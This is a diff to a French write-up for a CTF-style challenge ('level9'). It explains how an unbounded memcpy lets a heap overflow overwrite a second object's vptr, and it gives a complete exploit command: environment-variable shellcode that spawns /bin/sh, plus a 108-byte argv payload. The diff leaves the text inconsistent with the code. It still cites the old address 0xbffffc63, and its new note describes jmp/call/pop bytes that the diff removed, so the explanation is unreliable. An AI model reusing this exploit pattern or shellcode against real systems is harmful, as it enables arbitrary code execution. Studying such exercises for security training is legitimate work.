@@ -13,7 +13,7 @@ Référence : `commands.md`, Recon / Extraction.
 ## 3. Binary-to-source translation (source reconstruction)
 - **Deux objets N (0x6c octets).** setAnnotation(premier, argv[1]) fait **memcpy(premier+4, argv[1], strlen(argv[1]))** sans borne. Appel virtuel : (*(second->vptr))(second, first). second = premier+0x6c ; le **vptr** du second est à l’offset 0 du second.
 - **Où ça peut casser :** l’overflow depuis le buffer d’annotation (premier+4) peut atteindre le second objet. Offset : 4 (vptr premier) + 100 (annotation) + 4 (membre int) = **108** octets pour écraser le **vptr** du second. Si on met **premier+4** dans second->vptr, l’appel lit *(premier+4) et saute à cette adresse. Si on place à premier+4 l’**adresse du shellcode** (ex. dans l’env), le call exécute notre code.
-- Source : voir `source.c` / `source.md` (C++ simplifié).
+- Source : voir `source` (C++ simplifié).
 
 ## 4. Understanding where it can break (vulnerability hypothesis)
 - **Fonctions suspectes :** memcpy(this+4, src, strlen(src)) sans borne dans setAnnotation.
@@ -69,9 +69,11 @@ Référence : `commands.md`, Recon / Extraction.
 
 **Commande finale (`commands.md`, Exploitation) :**
 ```bash
-env -i payload=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level9 $(python -c 'print "\x63\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')
+env -i payload=$(python -c 'print "\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80/bin/sh"') ./level9 $(python -c 'print "\x03\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')
 ```
 (Remplacer 0xbffffc63 par l’adresse trouvée en GDB si différente.)
+
+**Origine des octets du shellcode :** le shellcode est du code machine qui exécute **execve("/bin/sh", NULL, NULL)**. La conversion (asm → octets `\xeb\x1f\x5e...`) est détaillée dans **level9/Ressources/shellcode_pas_a_pas.md** : écriture en assembleur (jmp/call/pop pour l’adresse de "/bin/sh"), assemblage (nasm), extraction des octets (xxd), mise en forme `\xXX` pour Python.
 
 **Décomposition :**
 
